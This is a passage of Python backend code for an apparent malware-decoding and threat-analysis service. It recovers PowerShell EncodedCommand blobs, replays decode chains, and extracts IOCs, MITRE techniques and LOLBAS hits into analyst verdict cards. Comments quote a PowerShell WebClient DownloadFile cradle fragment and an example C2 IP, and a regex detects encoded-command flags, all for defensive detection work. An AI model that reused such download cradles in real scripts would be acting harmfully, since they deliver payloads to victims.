                            "partial_recovery":     dict(_rep.partial_recovery),
                            "confidence_band":      _rep.confidence_band,
                            "confidence_reason":    _rep.confidence_reason,
                            "recovered_layers":     _rep.recovered_layers,
                        },
                        "reason": "PowerShell EncodedCommand recovery chain exhausted",
                        "output_preview": "",
                        "output_length": 0,
                    }],
                    "chain_ids": ["ps-encodedcommand-recovery"],
                    "iocs":   {"ips": [], "urls": [], "domains": [], "emails": [],
                                "file_paths": [], "bitcoin_addresses": [],
                                "hashes": {"md5": [], "sha1": [], "sha256": []}},
                    "mitre":  [], "lolbas": [], "tradecraft": [],
                    "verdict": "decode_error",
                    "verdict_display": "Undetermined",
                    "confidence_band": _rep.confidence_band,
                    "recovered_layers": _rep.recovered_layers,
                    "verdict_card": {
                        "verdict": "decode_error",
                        "verdict_display": "Undetermined",
                        "risk_score": None,   # explicit — do NOT imply benign
                        "score": None,
                        "confidence": _rep.confidence_band,
                        "confidence_band": _rep.confidence_band,
                        "recovered_layers": _rep.recovered_layers,
                        "headline": "Decode failure — recovery chain exhausted",
                        "why": (
                            f"Base64 decoded successfully ({_rep.b64_bytes} bytes) but "
                            f"no decoder in the recovery chain produced valid PowerShell text. "
                            f"UTF-16LE strict validation failed at byte offset "
                            f"{_rep.first_invalid_offset}."
                        ),
                    },
                    "decode_error": {
                        "status":               _rep.status,
                        "b64_bytes":            _rep.b64_bytes,
                        "b64_status":           _rep.b64_status,
                        "b64_reason":           _rep.b64_reason,
                        "first_invalid_offset": _rep.first_invalid_offset,
                        "invalid_reason":       _rep.invalid_reason,
                        "hex_preview":          _rep.hex_preview,
                        "possible_causes":      list(_rep.possible_causes),
                        "attempts":             [a.to_dict() for a in _rep.attempts],
                        "blob_length":          len(_blob),
                        "partial_recovery":     dict(_rep.partial_recovery),
                        "confidence_band":      _rep.confidence_band,
                        "confidence_reason":    _rep.confidence_reason,
                        "recovered_layers":     _rep.recovered_layers,
                    },
                    "custom_recipes_matched": [],
                    "canonical_artifact": _pse_ca,
                }
    except Exception:
        # Preamble must never break the pipeline — fall through to legacy.
        pass
    # ──────────────────────────────────────────────────────────────────────

    # ── Multi-fragment auto-split (v1.3.1) ─────────────────────────────
    raw_input = body.input or ""
    _has_br = bool(re.search(r"(?i)<\s*br\s*/?\s*>", raw_input))
    _norm = re.sub(r"(?i)<\s*br\s*/?\s*>", "\n\n", raw_input)
    _enc_count = len(re.findall(r"(?i)-\s*e(?:c|nc|ncoded(?:command)?)\b", _norm))
    _fragments: List[str] = []
    if _has_br or _enc_count >= 2:
        _fragments = [p.strip() for p in re.split(r"\n\s*\n+", _norm.strip()) if p.strip()]
    if len(_fragments) >= 2:
        return await _decode_multi_fragment(_fragments, body, user)

    custom_matches = await ms.find_matching_recipes(db, body.input)
    if custom_matches:
        best = custom_matches[0]
        await ms.increment_usage(db, best["id"])
        try:
            steps_for_run = [RecipeStep(op=s["op"], args=s.get("args") or {})
                             for s in best["ops"] if s.get("op") in OPERATIONS]
            if steps_for_run:
                result_custom = await run_recipe(
                    RunRecipeIn(input=body.input, steps=steps_for_run), user=user,
                )
                # Feb 2026 — RACE-CHECK the custom recipe against the
                # deterministic pipeline. Custom recipes are user-authored
                # snapshots and can silently short-circuit newer chains (like
                # the b64+xor Meterpreter runner where the recipe stops at
                # `base64-decode` while the deterministic pipeline continues
                # to `xor-brute` and reaches actual shellcode). If deterministic
                # goes DEEPER (more steps) or REACHES SHELLCODE, prefer it.
                try:
                    det_race = await run_offloaded(
                        deterministic_best_decode,
                        body.input,
                        analysis_mode=body.analysis_mode or "balanced",
                    )
                except HTTPException:
                    raise
                except Exception:
                    det_race = None
                _custom_chain_len = len(steps_for_run)
                _det_chain_len = len(det_race.get("steps") or []) if det_race else 0
                _det_reached_sc = bool(det_race and det_race.get("reached_shellcode"))
                _prefer_deterministic = (
                    det_race is not None
                    and (_det_reached_sc or _det_chain_len > _custom_chain_len + 0)
                )
                if _prefer_deterministic:
                    # Skip the custom-recipe short-circuit — fall through to the
                    # normal deterministic path below.
                    pass
                else:
                    recipe_out = [
                        {"op": s.op, "args": s.args, "reason": f"custom recipe: {best['name']}",
                         "custom": True, "model_id": best["id"], "model_name": best["name"]}
                        for s in steps_for_run
                    ]
                    return {
                        "recipe": recipe_out,
                        "output": result_custom.output,
                        "notes": [f"Applied custom recipe '{best['name']}' from Model Studio"],
                        "detected_type": detect_payload_type(result_custom.output),
                        "engine": "custom_recipe",
                        "reached_shellcode": False,
                        "trace": [
                            {"op": s.op, "args": s.args, "reason": f"custom recipe: {best['name']}",
                             "output_preview": (result_custom.steps_output[i].get("output_preview") or "")
                             if i < len(result_custom.steps_output) else "",
                             "output_length": result_custom.steps_output[i].get("output_length")
                             if i < len(result_custom.steps_output) else None}
                            for i, s in enumerate(steps_for_run)
                        ],
                        "custom_recipes_matched": [
                            {"id": r["id"], "name": r["name"]} for r in custom_matches
                        ],
                    }
        except Exception:
            pass

    # ═══════════════════════════════════════════════════════════════════
    # ARB PR-2.1.2 · Canonical Evidence Recovery Service (Phase A).
    # `/decode/smart` and `/analyze/async` now share a single recovery
    # function so identical inputs produce byte-identical canonical
    # artifacts regardless of entry point. Preserves the v1.5.6 event-loop
    # offloading — the service internally uses `run_offloaded`. Pre-gate
    # checks above (ingress / atomic-IOC / PS-encoded / multi-fragment)
    # remain in the router because they early-return fully-shaped
    # responses; the service's own pre-gates are idempotent so calling
    # the service after those checks is safe. See
    # `services/canonical_evidence_recovery.py`.
    # ═══════════════════════════════════════════════════════════════════
    from services.canonical_evidence_recovery import (
        recover_canonical_evidence_async,
    )
    _canonical_artifact = await recover_canonical_evidence_async(
        body.input,
        analysis_mode=body.analysis_mode or "balanced",
    )
    # Safety: `_canonical_artifact.det_result` is guaranteed populated
    # for terminal_state ∈ {recovered, stability_gate, passthrough}.
    # The other terminal states (atomic_ioc / decode_error /
    # multi_fragment) were already handled by the router-level
    # short-circuits above, so we never reach here in those cases.
    det = _canonical_artifact.det_result or {
        "output": _canonical_artifact.decoded_output,
        "steps":  _canonical_artifact.chain_steps,
        "engine": _canonical_artifact.engine,
        "score":  ((_canonical_artifact.confidence or 0) / 100.0),
        "reached_shellcode": _canonical_artifact.reached_shellcode,
        "notes": list(_canonical_artifact.notes),
    }

    # ── RC4.1 · Crypto-API honest-verdict annotation ─────────────────────
    # Runs unconditionally on the raw input so the annotator fires even when
    # rc22_adapter / smart_decode wins the chain race and skips
    # deterministic_best_decode's post-hoc annotation block.
    try:
        from decoders.crypto_api_annotator import _find_all as _crypto_find  # noqa
        _crypto_hits = _crypto_find((body.input or "").lower())
        if _crypto_hits:
            _existing_mitre = det.get("mitre") or []
            _seen_mitre = {(m.get("id") if isinstance(m, dict) else str(m))
                           for m in _existing_mitre}
            for h in _crypto_hits:
                for mid in h.get("mitre") or []:
                    if mid not in _seen_mitre:
                        _seen_mitre.add(mid)
                        _existing_mitre.append({
                            "id":        mid,
                            "technique": h.get("algorithm", "Cryptography"),
                            "tactic":    "Defense Evasion",
                            "evidence":  f"{h.get('algorithm')} · key_source={h.get('key_source')} "
                                         f"· recovery={h.get('recovery')}",
                            "source":    "rc41-crypto-annotator",
                        })
            det["mitre"] = _existing_mitre
            det["crypto_hints"] = _crypto_hits
            _recoverable = sum(1 for h in _crypto_hits if h.get("recovery") == "static-complete")
            _runtime     = sum(1 for h in _crypto_hits if h.get("recovery") == "runtime-required")
            det["static_recovery"] = {
                "static_stages":  _recoverable,
                "runtime_stages": _runtime,
                "verdict": (
                    "static-recovery-complete · runtime-decryption-required"
                    if _runtime > 0 else "static-recovery-complete"
                ),
            }
            banner = "▼ CRYPTO API DETECTED (RC4.1 · honest-verdict)\n" + "\n".join(
                f"  · {h['algorithm']:<24} key_source={h['key_source']} recovery={h['recovery']}"
                for h in _crypto_hits
            ) + "\n\n"
            det["output_raw"] = banner + str(det.get("output_raw") or det.get("output") or "")
    except Exception:
        pass
    # ─────────────────────────────────────────────────────────────────────

    # === Learning Feedback Loop — Task 3 ============================== #
    # Compute the boost BEFORE deciding — we don't rewrite the decoder,
    # we simply attach transparency + record auto-hit/miss so future
    # boosts learn from this outcome. Auto-boost is on unless disabled.
    boost_meta = None
    boost_hit = False
    if not body.disable_boost:
        try:
            from learning.booster import boost as _boost
            from learning.feedback import record_auto
            boost_meta = await _boost(body.input, user["email"])
            if boost_meta.get("enabled") and boost_meta.get("chain"):
                actual_chain = [s["op"] for s in det.get("steps") or []]
                boost_hit = (actual_chain == boost_meta["chain"])
                # Fire-and-forget feedback signal for future ranking
                await record_auto(user["email"], boost_meta["chain"], success=boost_hit)
        except Exception:
            boost_meta = None
    # ================================================================== #

    # Build per-layer trace by re-running the winning chain step-by-step so
    # the frontend Decoding Trace panel has intermediate outputs to display.
    # Note: `extract-payload` is a virtual op that the magic decoder uses
    # internally to strip script wrappers — we handle it here directly via
    # the payload sanitizer.
    #
    # ARB PR-2.1.2 fix (2026-08-05): L0 canonical chain steps MUST NEVER
    # surface as "Unknown operation" errors in the trace UI even if the
    # router's smaller `OPERATIONS` dict doesn't know how to replay them.
    # If the op is a registered L0 convergence transformation, we record
    # a clean chain step (no error) with the L0 layer name and continue
    # the loop with `cur` unchanged — matching the ARB acceptance
    # criterion 0 (canonical chain is trusted, never replayed through a
    # lesser registry).
    try:
        from workspace.convergence.registry import registry_by_name as _l0_by_name
        _L0_OP_IDS = set(_l0_by_name().keys())
    except Exception:
        _L0_OP_IDS = set()
    # ── ARB PR-2.2 Phase A · L0 read-only transformation bridge ──
    # Exposes the REAL deterministic output of each L0 stage in the
    # trace UI. Observability only — no self-healing, no quality
    # gates, no alternates (deferred to Phase B/C per ARB decision).
    from services.l0_bridge import execute_l0_transformation as _run_l0_op
    from payload_sanitizer import sanitize_encapsulated_payload, find_all_base64_spans
    trace: List[Dict[str, Any]] = []
    cur = body.input
    for step in det.get("steps") or []:
        op_id = step["op"]
        args = step.get("args") or {}
        # ── ARB PR-2.2 Phase A · canonical-L0-op REAL execution ──
        # If the router doesn't own this op but the L0 engine does,
        # invoke the L0 transformation's own `apply(buffer)` callable
        # via the read-only bridge and record the actual per-stage
        # output. Observability only — never repairs, never chooses
        # alternates.
        #
        # ARB governance · trace generation is best-effort ONLY.
        # Trace failures MUST NEVER alter canonical evidence, verdict
        # computation, investigation output, or analyst workflow. The
        # `cur = nxt` assignment below is scoped to the trace loop —
        # the final canonical output comes from `det["output"]`
        # (populated by L0 `deterministic_best_decode`), not from
        # `cur`. See GOVERNANCE_RULES.md · Rule 16.
        if op_id not in OPERATIONS and op_id in _L0_OP_IDS:
            try:
                nxt, fires, l0_err = _run_l0_op(op_id, cur)
                entry = {
                    "op": op_id, "args": args,
                    "reason": _reason_for_op(op_id),
                    "output_preview": (nxt[:400] if isinstance(nxt, str) else str(nxt)[:400]),
                    "output_length":  (len(nxt) if isinstance(nxt, str) else None),
                    "canonical_l0":   True,   # UI label: "canonical L0 stage"
                    "fires":          fires,  # 0 == transformation didn't fire
                    "bridge_status":  "ok" if l0_err is None else "warn",
                }
                if l0_err:
                    # Non-fatal note — never set "error" (which the FE
                    # renders as a red banner). Stage still advanced.
                    entry["bridge_reason"] = l0_err
                    entry["l0_note"] = l0_err   # legacy field, retained for UI
                trace.append(entry)
                cur = nxt  # ADVANCE trace-loop buffer only — L0 owns canonical.
            except Exception as _l0e:
                # Bridge failure — CI/strict mode escalates so engineers
                # discover bugs pre-release; production falls back to a
                # safe echo entry so the trace still populates.
                if os.environ.get("L0_BRIDGE_STRICT") == "1":
                    raise
                log.warning("l0_bridge fallback for %s: %s", op_id, _l0e)
                trace.append({
                    "op": op_id, "args": args,
                    "reason": _reason_for_op(op_id),
                    "output_preview": (cur[:400] if isinstance(cur, str) else str(cur)[:400]),
                    "output_length":  (len(cur) if isinstance(cur, str) else None),
                    "canonical_l0":   True,
                    "bridge_status":  "fallback",
                    "bridge_reason":  f"exception:{type(_l0e).__name__}",
                    "l0_note":        f"bridge exception ({type(_l0e).__name__}) — buffer unchanged",
                })
            continue
        try:
            if op_id == "extract-payload":
                iso = sanitize_encapsulated_payload(cur)
                if iso and iso != cur.strip():
                    nxt = iso
                else:
                    # nested base64 span extraction
                    spans = find_all_base64_spans(cur, min_len=24)
                    if spans:
                        nxt = spans[0]
                    else:
                        # nested hex span extraction (echo / Write-Output / certutil wrappers)
                        hex_hits = re.findall(r"['\"]?([0-9a-fA-F]{8,})['\"]?", cur)
                        hex_valid = [h for h in hex_hits
                                      if len(h) % 2 == 0
                                      and re.search(r"[a-fA-F]", h)]
                        nxt = max(hex_valid, key=len) if hex_valid else cur
            else:
                nxt = run_operation(op_id, cur, args)
        except Exception as e:
            trace.append({"op": op_id, "args": args,
                          "error": str(e), "reason": _reason_for_op(op_id)})
            break
        preview = nxt[:400] if isinstance(nxt, str) else str(nxt)[:400]
        trace.append({
            "op": op_id, "args": args,
            "reason": _reason_for_op(op_id),
            "output_preview": preview,
            "output_length": len(nxt) if isinstance(nxt, str) else None,
        })
        cur = nxt

    result = {
        "recipe": [{"op": s["op"], "args": s.get("args") or {}, "reason": _reason_for_op(s["op"])}
                   for s in det.get("steps") or []],
        "output": det.get("output") or "",
        "notes": det.get("notes") or [],
        "detected_type": detect_payload_type(det.get("output") or ""),
        "engine": det.get("engine"),
        "reached_shellcode": det.get("reached_shellcode", False),
        "confidence": int(round(min(1.0, det.get("score", 0.0)) * 100)),
        "trace": trace,
        # Flat convenience fields — Feb 2026 · regression + UI consumers.
        # `chain_ids` mirrors `recipe[].op` for callers that want a bare
        # list; `score` mirrors `confidence` (kept for both names).
        "chain_ids": [s["op"] for s in (det.get("steps") or [])],
        "score":     int(round(min(1.0, det.get("score", 0.0)) * 100)),
        "custom_recipes_matched": [
            {"id": r["id"], "name": r["name"]} for r in custom_matches
        ],
        "boost": boost_meta,
        "boost_hit": boost_hit,
        # ▲ FORENSIC RULE — corrupted container signal (Feb-2026)
        # When set, the frontend renders a big-red "Corrupted <kind>
        # container" panel with the exact CRC / truncated-stream reason
        # instead of a misleading "high-confidence xor-brute" result.
        "corrupted_container": det.get("corrupted_container"),
        # ▲ REASONING ENGINE — evidence-based trace (Feb-2026)
        # Attached whenever analysis_mode is balanced/deep. Contains input
        # profile (kind, entropy, letter ratios), linguistic delta, and
        # step-by-step "considered / chosen / rejected" reasoning per layer.
        "reasoning": det.get("reasoning"),
        # ▲ ZERO-MISS ESCALATION LADDER (v1.5.1)
        # Records what each layer (L1 smart / L2 magic / L3 llm-l3) produced
        # so the frontend can render the escalation trace. `winner_layer`
        # tells the UI which card to highlight.
        "layer_trace": det.get("layer_trace") or [],
        "l3_metadata": det.get("l3_metadata"),
        # ▲ PER-LAYER IOC/LOLBAS ATTRIBUTION (v1.5.4)
        # Populated later once we've run per-layer extract_iocs / scan_lolbas.
        # Shape: [{layer, op, iocs, lolbas}] — allows TI-HITS panel to chip
        # each hit with the layer that revealed it.
        "layer_iocs": [],
        "analysis_mode": body.analysis_mode or "balanced",
        # ▲ ARB PR-2.1.2 · Canonical Evidence Recovery Service artifact.
        # Same shape produced by `services.canonical_evidence_recovery`,
        # so `/analyze/async` (Phase B) can attach the identical field.
        # Enables byte-for-byte parity tests between Decode and Auto
        # Investigate for the same input.
        "canonical_artifact": _canonical_artifact.to_dict(),
        # ▲ IEDDE SSOT · Priority 1 · 2026-02
        # Top-level convenience surface for the IEDDE decision trace and
        # analyst-facing recovery signals. Same data as
        # `canonical_artifact.iedde_trace` but hoisted for easy consumption
        # by the Workspace IEDDE Decision Trace panel + Terminal State +
        # Canonical Confidence pills. Never overrides legacy fields.
        "iedde": _canonical_artifact.iedde_trace,
        "iedde_terminal_state": _canonical_artifact.iedde_terminal_state,
        "canonical_confidence": _canonical_artifact.canonical_confidence,
        "canonical_confidence_reason": _canonical_artifact.canonical_confidence_reason,
    }

    # ▲ SOC EVIDENCE — per-layer metadata (Feb-2026)
    # For every step in the decoding trace, append an `evidence` block:
    # { encoding, length, ascii, entropy, hex_preview, integrity } — feeds
    # the analyst-workbench Layer Metadata panel.
    try:
        from evidence_extractor import layer_metadata, build_verdict_card
        for t in trace:
            after = t.get("output_preview") or ""
            ok = "error" not in t
            reason = t.get("error")
            t["evidence"] = layer_metadata(t.get("op") or "", after,
                                           integrity_ok=ok,
                                           integrity_reason=reason)

        # ── Best-effort container recovery mode ─────────────────────────
        # When the analyst opts into best-effort AND a corrupted container
        # produced a salvaged plaintext, elevate the salvage to the primary
        # output (with a permanent integrity warning appended). Verdict
        # downgrades from Corrupted → Suspicious so the downstream Sample
        # Library / TAXII / SIEM tooling can still ingest the payload.
        cc = result.get("corrupted_container")
        salvaged = (cc or {}).get("salvaged") if cc else None
        mode = (body.mode or "strict").lower()
        if mode == "best_effort" and cc and salvaged:
            result["output"] = (
                f"{salvaged}\n\n"
                f"⚠ Integrity Warning · {cc.get('kind')} trailer invalid: "
                f"{cc.get('reason')}. Payload recovered by best-effort raw "
                f"deflate — CRC / ISIZE could NOT be verified. Treat as "
                f"unverified plaintext until compared against source."
            )
            # keep the corrupted_container object so the UI still shows the
            # ⚠ badge, but note the recovery mode used.
            cc["mode"] = "best_effort"
            # Rebuild verdict card with the elevated context so verdict
            # becomes Suspicious (not Corrupted).
            result["verdict_card"] = build_verdict_card(
                input_text=body.input,
                output_text=salvaged,
                chain=[{"op": s["op"], "args": s.get("args") or {}} for s in det.get("steps") or []],
                corrupted_container=None,   # bypass corrupted short-circuit
            )
            # Prepend an explicit warning indicator so analysts see it up top.
            if result["verdict_card"]:
                result["verdict_card"]["indicators"].insert(0, {
                    "kind":  "negative",
                    "label": (f"⚠ Best-effort recovery — {cc.get('kind')} CRC/ISIZE "
                              f"validation FAILED ({cc.get('reason')}); "
                              f"{len(salvaged)} bytes salvaged unverified."),
                })
                result["verdict_card"]["recommended_action"] = (
                    "Verify salvaged plaintext against source before use. "
                    "Attackers occasionally corrupt archive trailers to evade "
                    "signature-based tooling — treat contents as unverified."
                )
            result["mode"] = "best_effort"
        else:
            # Strict mode — default. Verdict Card + evidence already carry
            # the corrupted state including the salvaged bytes on
            # `corrupted_container.salvaged` for the UI to preview.
            result["verdict_card"] = build_verdict_card(
                input_text=body.input,
                output_text=result["output"],
                chain=[{"op": s["op"], "args": s.get("args") or {}} for s in det.get("steps") or []],
                corrupted_container=result.get("corrupted_container"),
            )
            result["mode"] = "strict"
    except Exception:
        # Never break /decode/smart if evidence extraction hiccups. Full
        # traceback goes to the internal logger; the analyst-facing card
        # gets a GENERIC message — never a raw exception type/message.
        log.exception("Verdict card generation failed in /decode/smart")
        from evidence_extractor import _fallback_card, _FALLBACK_REASON
        result["verdict_card"] = _fallback_card(_FALLBACK_REASON)

    # ── Canonical Risk Projection (ARB Rules 12, 15) ───────────────────
    # `risk` is a *projection* of `verdict_card`, never independent.
    # See backend/verdict_projection.py. This is the ONLY approved way
    # to build the legacy `risk` shape.
    try:
        from verdict_projection import derive_risk_projection
        projected = derive_risk_projection(result.get("verdict_card") or {})
        result["risk"] = projected or {"verdict": "Unknown", "level": "unknown", "score": 0}
    except Exception:
        result["risk"] = {"verdict": "Unknown", "level": "unknown", "score": 0}

    # ── IOC / MITRE / LOLBAS enrichment (Feb-2026 fix) ─────────────────
    # Previously `/api/decode/smart` returned an empty analysis panel for
    # plain-text PowerShell / cmd payloads because it only scanned the
    # DECODED output — for a passthrough decode (input already plaintext)
    # the decoded output equalled the input, but the router didn't scan
    # EITHER. Result: user pasted `powershell.exe … (New-Object
    # Net.WebClient).DownloadFile …` and the Attack Graph / IOC / MITRE
    # panels were empty.
    #
    # Fix: run the same extractors used by /api/decode/candidates against
    # the concatenation of INPUT + OUTPUT so the analyst gets IOC signals
    # regardless of whether decoding actually removed anything.
    #
    # Also: augment `_scan_text` with reversed copies of any single-quoted
    # or double-quoted string literals so the URL / IP obfuscated by a
    # PowerShell `[1..0]` char-reverse trick (e.g. Payload A above) leaks
    # into the IOC extractor without needing a full recursive decoder.
    try:
        from operations import extract_iocs, mitre_map
        from lolbas import scan_lolbas
        base_text = (body.input or "") + "\n" + (result.get("output") or "")
        # ── v1.5.4 · Per-layer IOC surfacing WITH layer attribution ─────
        # Every intermediate `output_preview` gets scanned individually so we
        # can tell the analyst WHICH layer surfaced each URL/IP/domain — TI
        # hits are then chip-tagged with "L2" / "L3" / etc.
        _layer_texts: List[str] = []
        _layer_records: List[Dict[str, Any]] = []  # [{layer, op, iocs, lolbas}]
        for _idx, t in enumerate(trace or []):
            preview = t.get("output_preview") or ""
            if preview and preview not in _layer_texts:
                _layer_texts.append(preview)
            try:
                _l_iocs = extract_iocs(preview or "") if preview else {}
            except Exception:
                _l_iocs = {}
            try:
                _l_lol = scan_lolbas(preview or "") if preview else []
            except Exception:
                _l_lol = []
            # Only record layers that actually surfaced SOMETHING new
            has_ioc = any((_l_iocs.get(k) or []) for k in ("urls", "ips", "domains", "md5", "sha1", "sha256"))
            if has_ioc or _l_lol:
                _layer_records.append({
                    "layer":  _idx + 1,
                    "op":     t.get("op"),
                    "iocs":   _l_iocs,
                    "lolbas": _l_lol,
                })
        _quoted = re.findall(r"(['\"])([^'\"\r\n]{6,256})\1", body.input or "")
        _reversed_bits = [g[1][::-1] for g in _quoted if g and g[1]]
        for lt in _layer_texts:
            if 6 <= len(lt) <= 2048:
                _reversed_bits.append(lt[::-1])
        _scan_parts = [base_text] + _layer_texts
        if _reversed_bits:
            _scan_parts.extend(_reversed_bits)
        _scan_text = "\n".join(_scan_parts)
        try:
            result["iocs"] = extract_iocs(_scan_text)
        except Exception:
            result["iocs"] = {}

        # ── RC4.6.1 · Binary shellcode IOC lift ────────────────────────
        # When the final decoded layer is raw shellcode (Meterpreter /
        # MSFvenom / CS beacon), the text-only `extract_iocs` above sees
        # replacement chars (\ufffd) instead of the ASCII strings embedded
        # in the shellcode — so C2 IPs like `149.28.81.19` and the
        # attacker's User-Agent never make it into `iocs.ips` / `iocs.urls`.
        #
        # Fix: if `reached_shellcode`, re-scan the FINAL output text as
        # bytes with `shellcode_analyzer.extract_iocs()` which walks
        # ASCII + UTF-16LE strings inside the binary buffer and merges
        # any new URL / IP / domain / hash / regkey / mutex / imports
        # into the top-level `iocs` dict. Purely additive (never removes).
        try:
            if result.get("reached_shellcode"):
                from shellcode_analyzer import extract_iocs as _bin_iocs
                # `result["output"]` contains the analyst-facing rendering
                # which retains the shellcode bytes as latin-1 codepoints.
                # trace[-1].output_preview is sometimes an error message
                # (e.g. "xor-brute · no plausible plaintext…"), so we
                # prefer the final `output` field which holds the real
                # decoded buffer.
                _src_text = result.get("output") or ""
                if _src_text:
                    try:
                        _raw = _src_text.encode("latin-1", errors="replace")
                    except Exception:
                        _raw = _src_text.encode("utf-8", errors="replace")
                    b = _bin_iocs(_raw) or {}
                    _iocs = result.get("iocs") or {}
                    for _k in ("urls", "ips", "domains", "regkeys", "mutexes", "imports"):
                        _existing = _iocs.get(_k) or []
                        for _v in (b.get(_k) or []):
                            if _v and _v not in _existing:
                                _existing.append(_v)
                        _iocs[_k] = _existing
                    _iocs.setdefault("hashes", {})
                    for _h in ("md5", "sha1", "sha256"):
                        _cur = _iocs["hashes"].get(_h) or []
                        for _v in ((b.get("hashes") or {}).get(_h) or []):
                            if _v and _v not in _cur:
                                _cur.append(_v)
                        _iocs["hashes"][_h] = _cur
                    result["iocs"] = _iocs
        except Exception:
            # Never let the binary IOC lift break the pipeline.
            pass
        try:
            result["mitre"] = mitre_map(_scan_text)
        except Exception:
            result["mitre"] = []
        try:
            result["lolbas"] = scan_lolbas(_scan_text)
        except Exception:
            result["lolbas"] = []
        # v1.5.4 — attach per-layer attribution for the TI-HITS panel + AI narrative
        result["layer_iocs"] = _layer_records

        # ── P0.1 (Feb-2026) · Verdict-card rebuild with full findings ───
        # The FIRST verdict-card pass (line ~650) ran BEFORE the IOC /
        # MITRE / LOLBAS enrichment, so it decided the verdict on
        # byte-level artifacts + chain length only. Payloads with 7 MITRE
        # + LOLBIN + URL but no MZ header ended up bland "Suspicious @ 30%"
        # (or `None` if a step-dict was malformed). Rebuild the card here
        # with the full findings surface so the analyst brief actually
        # reflects the tradecraft the enrichment pipeline detected.
        try:
            from evidence_extractor import build_verdict_card as _rebuild_vc
            _findings = {
                "iocs":              result.get("iocs") or {},
                "mitre_techniques":  result.get("mitre") or [],
                "lolbas":            result.get("lolbas") or [],
                "family":            (result.get("verdict_card") or {}).get("family"),
            }
            _new_vc = _rebuild_vc(
                input_text=body.input or "",
                output_text=result.get("output") or "",
                chain=[{"op": s.get("op"), "args": s.get("args") or {}}
                       for s in (det.get("steps") or []) if isinstance(s, dict)],
                corrupted_container=result.get("corrupted_container"),
                findings=_findings,
            )
            if _new_vc:
                # Preserve any best-effort recovery indicators from the
                # first pass by keeping the FIRST-PASS card if it was
                # already stronger than the rebuild (label rank).
                _rank = {"Malicious": 4, "Suspicious": 3, "Corrupted": 2,
                          "Benign": 1, "Undecoded": 0, "Inconclusive": 0}
                _old_vc = result.get("verdict_card") or {}
                _old_r = _rank.get(_old_vc.get("label") or "", -1)
                _new_r = _rank.get(_new_vc.get("label") or "", -1)
                if _new_r >= _old_r:
                    result["verdict_card"] = _new_vc
        except Exception:
            # Rebuild is a nice-to-have — never fail the request over it.
            # Full traceback to the internal logger only; never propagate
            # the exception text to the analyst UI.
            log.exception("Verdict card rebuild (post-enrichment) failed")
    except Exception:
        pass

    # ── v1.5.5 · TI SHIELD · 360° per-layer intelligence correlator ──
    # Runs EVERY intel source (IOC/LOLBAS/MITRE/YARA + local TI + all 9
    # live OSINT providers + family hint + severity) against EVERY decode
    # layer. Time-boxed to 18s hard cap so the request never blows the
    # 90s gateway. If it can't finish inside the budget → returns what it
    # has and logs. Live OSINT itself is capped inside layer_360.
    try:
        import asyncio as _asyncio
        from layer_360 import enrich_layers_360
        _layer_records_for_shield = locals().get("_layer_records", [])
        result["ti_shield"] = await _asyncio.wait_for(
            enrich_layers_360(
                layer_records=_layer_records_for_shield,
                raw_input=body.input or "",
                final_output=result.get("output") or "",
            ),
            timeout=18.0,
        )
    except _asyncio.TimeoutError:
        result["ti_shield"] = []
        result.setdefault("notes", []).append("TI Shield exceeded 18s budget — final-layer-only")
    except Exception as _e:  # noqa: BLE001
        result["ti_shield"] = []
        # Enrichment imports must never break the decode contract.
        result.setdefault("iocs", {})
        result.setdefault("mitre", [])
        result.setdefault("lolbas", [])

    # ── Investigation-Report synthesis (Feb-2026 UX fix) ────────────────
    # The OUTPUT panel must NOT silently echo the analyst's input when
    # the payload is already plaintext (nothing to decode). Instead we
    # generate a SOC-format summary from the enriched IOC/MITRE/LOLBAS
    # signals + verdict card and put that in `output`. The raw decoded
    # content is preserved in `output_raw` for any tooling that still
    # needs it, and the report is also exposed via `report_text` so the
    # frontend can render it in a dedicated panel if it wants to.
    try:
        from investigation_report import synthesize_report
        vc = result.get("verdict_card") or {}
        risk = None
        # RC3.1.1 hotfix (PROD-BUG-1): the embedded Investigation Summary
        # was rendering "conf 0/100" because `result['confidence']` reflects
        # the deterministic DECODE confidence (0.0 for a plain base64→PE
        # decode), not the analyst-facing THREAT confidence. Unify: prefer
        # verdict_card.risk_score / verdict_card.confidence, which is what
        # the Analysis Verdict card and Threat Analysis rail also show.
        vc_score = vc.get("risk_score") or vc.get("score")
        vc_conf  = vc.get("confidence")
        if vc_score is None and isinstance(vc_conf, (int, float)):
            vc_score = int(round(float(vc_conf) * 100)) if vc_conf <= 1 else int(vc_conf)
        if vc and vc.get("verdict"):
            risk = {"verdict": vc.get("verdict"), "score": vc_score}
        # Investigation-summary confidence follows the same source of truth.
        summary_confidence = vc_score if vc_score is not None else result.get("confidence")
        report_txt = synthesize_report(
            input_text=body.input or "",
            output_text=result.get("output") or "",
            engine=result.get("engine"),
            confidence=summary_confidence,
            steps=[{"op": s["op"]} for s in det.get("steps") or []],
            iocs=result.get("iocs") or {},
            mitre=result.get("mitre") or [],
            lolbas=result.get("lolbas") or [],
            risk=risk,
            family=None,
            reached_shellcode=bool(result.get("reached_shellcode")),
            corrupted_container=result.get("corrupted_container"),
        )
        if report_txt:
            raw_output = result.get("output") or ""
            # ── Feb-2026 UX fix — DECODED PAYLOAD ALWAYS VISIBLE ────────────
            # The analyst must always see the decoded plaintext, not just the
            # summary. Two cases:
            #   1. terminal_archetype  → archetype output is a forensic report
            #      (hexdump, layer-by-layer breakdown, native-cmd table). Prepend
            #      the report_txt as a header AFTER the raw output.
            #   2. non-terminal         → raw output is the decoded plaintext.
            #      Prepend it, then attach the summary underneath.
            # ── Jul-2026 UX polish (pre-RC2.9) — label the two sections so
            #     the analyst never confuses the decoded payload with the
            #     investigation metadata. Same OUTPUT box, clear boundary.
            input_text = (body.input or "").strip()
            _DECODED_HDR = (
                "━" * 66 + "\n"
                "▼ DECODED OUTPUT" + "\n"
                + "━" * 66
            )
            if raw_output and raw_output.strip() != input_text:
                result["output_raw"] = raw_output
                result["output"] = (
                    f"{_DECODED_HDR}\n{raw_output}\n\n{report_txt}"
                )
                result["report_text"] = report_txt
            else:
                # Passthrough — no decoded content to prepend, show summary only.
                result["output_raw"] = raw_output
                result["output"] = report_txt
                result["report_text"] = report_txt
    except Exception:
        # Report synthesis is best-effort — never fail the decode.
        pass

    # ── v1.5.1 · Adversarial corpus writer ───────────────────────────
    # Every payload that goes UNDECODED in production becomes a permanent
    # regression case. This is the "never regress" safety net — once the
    # decoder team fixes the miss, the fix is protected forever.
    try:
        _steps_ct = len(det.get("steps") or [])
        _out = (result.get("output") or "").strip()
        _in = (body.input or "").strip()
        _undecoded = (_steps_ct == 0) or (_out == "") or (_out == _in)
        if _undecoded and len(_in) >= 8:
            from pathlib import Path
            import hashlib, json as _json
            from datetime import datetime, timezone
